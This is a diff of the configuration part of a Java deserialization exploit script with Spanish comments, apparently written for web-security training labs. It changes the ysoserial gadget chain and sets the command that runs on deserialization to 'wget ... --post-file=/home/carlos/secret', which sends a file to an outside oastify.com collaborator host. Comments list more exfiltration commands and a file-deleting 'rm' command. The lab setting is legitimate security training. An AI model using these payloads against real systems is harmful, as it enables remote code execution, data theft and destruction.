@@ -41,7 +41,7 @@ Si el modo elegido falla, reintenta con el otro (por las dudas).
 # Comunes en los labs: "CommonsCollections4", "CommonsCollections3",
 #                      "CommonsCollections2", "CommonsBeanutils1", "Groovy1".
 # Lista completa:  java -jar ysoserial-all.jar   (sin argumentos)
-GADGET = "Groovy1"
+GADGET = "CommonsBeanutils1"
 
 # --- Comando: lo que se ejecuta al deserializar (payload de inyeccion) -----
 # Cambia SOLO esta linea para otro comando. Ejemplos:
@@ -49,7 +49,7 @@ GADGET = "Groovy1"
 #   "wget http://TU-COLLAB.oastify.com --post-file=/home/carlos/secret"
 #   "curl http://TU-COLLAB.oastify.com/$(whoami)"
 COMMAND = "rm /home/carlos/secret"
-COMMAND = "wget https://oldx6490lk7bglo2zwbowc4wvn1ep9dy.oastify.com --post-file=/home/carlos/secret"
+COMMAND = "wget https://ua803dz7c7bb89pyt416vyzu0l6cu7iw.oastify.com --post-file=/home/carlos/secret"
 
 # --- Pipeline de capas -----------------------------------------------------
 # Arreglo de capas que se aplican a los bytes crudos, EN ORDEN.
